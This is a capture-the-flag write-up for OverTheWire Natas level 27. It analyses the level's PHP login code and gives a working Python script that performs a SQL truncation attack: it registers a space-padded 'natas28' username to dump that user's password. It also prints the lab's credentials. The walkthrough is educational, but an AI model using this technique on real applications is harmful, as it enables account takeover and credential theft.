# Level 27

## Challenge Details 

- **CTF:** OverTheWire
- **Category:** Natas

## Provided Materials

- [http://natas27.natas.labs.overthewire.org](http://natas27.natas.labs.overthewire.org)
- username: `natas27`
- password: `PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3`

## Solution

![start](./start.jpg)

Let's analyze the code step-by-step *(Starting from where we send the `username` and `password`)*:

```php
# If username and password are set
if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    # connection to db (not interesting)
    $link = mysqli_connect('localhost', 'natas27', '<censored>');
    mysqli_select_db($link, 'natas27');

    # if user is valid
    if(validUser($link,$_REQUEST["username"])) {
        ...
}
```

Let's see, what means `user is valid`:

```php
function validUser($link,$usr){
    # escape special characters from the username string
    $user=mysqli_real_escape_string($link, $usr);

    # normal select query
    $query = "SELECT * from users where username='$user'";
    # result from the query
    $res = mysqli_query($link, $query);
    # if there are some entries, that means that the user exists
    if($res) {
        if(mysqli_num_rows($res) > 0) {
            return True;
        }
    }
    return False;
}
```

Let's get back to the main code:

```php
if(validUser($link,$_REQUEST["username"])) {
    # If we are here, that means that the user exists
    # credentials check
    if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
    	...  
```

Let's see `checkCredentials` function:

```php
function checkCredentials($link,$usr,$pass){

    # escape special characters in username and password
    $user=mysqli_real_escape_string($link, $usr);
    $password=mysqli_real_escape_string($link, $pass);

    # normal select query
    $query = "SELECT username from users where username='$user' and password='$password' ";
    # result query
    $res = mysqli_query($link, $query);
    # if there are some entries, that means that the credentials are valid
    if(mysqli_num_rows($res) > 0){
        return True;
    }
    return False;
}
```

Back to main code:

```php
if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
    # If we are here, that means that the credentials are valid
    echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>";
    echo "Here is your data:<br>";
    # Output from dump data
    $data=dumpData($link,$_REQUEST["username"]);
    ...
```

Let's see `dumpData` function:

```php
function dumpData($link,$usr){

    # Again escape special characters in username
    # And VERY IMPORTANT thing here: username is getting trimmed!
    $user=mysqli_real_escape_string($link, trim($usr));

    # normal select query on TRIMMED username
    $query = "SELECT * from users where username='$user'";
    $res = mysqli_query($link, $query);
    # If there are some entries, then we will see the result
}
```

Back to main code:

```php
if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) {
    ...
    if(validUser($link,$_REQUEST["username"])) {
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
            ...
        }
        else{
            # When password was wrong for the username
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>";
        }
    }
    # also VERY IMPORTANT part starts here
    else {
        # user doesn't exist
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){
            ...
}
```

Let's analyze `createUser` function:

```php
function createUser($link, $usr, $pass){

    # If there are some spaces before or after username
    # Note, that trim trims only from left and right side, not in the middle
    # ' a' -> 'a' 
    # 'a ' -> 'a'
    # 'a a' -> 'a a'
    if($usr != trim($usr)) {
        echo "Go away hacker";
        return False;
    }
    # IMPORTANT: Escape username and password and trim them to 64 characters 
    # As in database definition: `username` varchar(64)
    $user=mysqli_real_escape_string($link, substr($usr, 0, 64));
    $password=mysqli_real_escape_string($link, substr($pass, 0, 64));

    # Insert those escaped and trimmed values
    $query = "INSERT INTO users (username,password) values ('$user','$password')";
    ...
}
```

So, let's summarize the process:

- **If username doesn't exists**:
  - Trim username (and password) to 64 characters *(username must be equal to trimmed username!)*
  - Insert those values
- **Otherwise**:
  - Check if user is valid **(nothing trimmed here!)**
  - Check credentials **(nothing trimmed here!)**
  - Output results *(`dumpData`)* **(THE USERNAME GETS TRIMMED!)**

So by now you should already have a rough idea of the solution, let's get into it!
No wonder, that the user `natas28` already exists in a database.
If we try to create user `natas28 + <64 - 7(natas28 length)> spaces + any character`, so it will be `natas28 + spaces = 64 characters` + `any character`. Why do we need to make so? *([SQL Truncation Attack](https://dyn20.gitbook.io/writeup-ctf/root-me/sql-truncation))* Because it will pass this check:

```php
# If there are some spaces before or after username
# Note, that trim trims only from left and right side, not in the middle
# ' a' -> 'a' 
# 'a ' -> 'a'
# 'a a' -> 'a a'
if($usr != trim($usr)) {
    echo "Go away hacker";
    return False;
}
```

And input in a database only `natas28 + 57 spaces`. 
Next we need to login as `natas28 + 57 spaces`, and as we have inserted user `natas28 + 57 spaces`, we will also pass `validUser` and `checkCredentials` checks. And then `dumpData` function will give us all entries of the **TRIMMED** username *(in our case -> `natas28`)*. Here is `python` script:

```py
import requests

# Base URL
url = 'http://natas27.natas.labs.overthewire.org'

# Function to make two GET requests (first one to create the user, second one - to get the info)
def send_2_get_requests():

    # Our parameters to pass $usr != trim($usr) check
    params = dict(username="natas28"+" " * 57 + "x", password="")
    
    headers = {
        'Authorization': 'Basic bmF0YXMyNzpQU084eHlzUGkwMFdLSWlaWjZzNlB0Um1GeTljYnhqMw==',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'close',
        'Cache-Control': 'max-age=0',
        'Origin': 'http://natas27.natas.labs.overthewire.org',
        'Referer': 'http://natas27.natas.labs.overthewire.org/',
        'Upgrade-Insecure-Requests': '1'
    }

    # Make the POST request with out params
    response = requests.post(url, headers=headers, params=params)

    # This will pass `validUser` and `checkCredentials` checks
    # And `dumpData` will trim the username (natas28 + spaces -> natas28)
    params = dict(username="natas28"+" " * 57, password="")

    # Make the second POST request with new params
    response = requests.post(url, headers=headers, params=params)

    return response.text

response = send_2_get_requests()
print(response)
```

Output:

```
Welcome natas28                                                         !<br>Here is your data:<br>Array
(
    [username] =&gt; natas28
    [password] =&gt; skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4
)
```

## Password

`natas28`:`skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4`

*Created by [bu19akov](https://github.com/bu19akov)*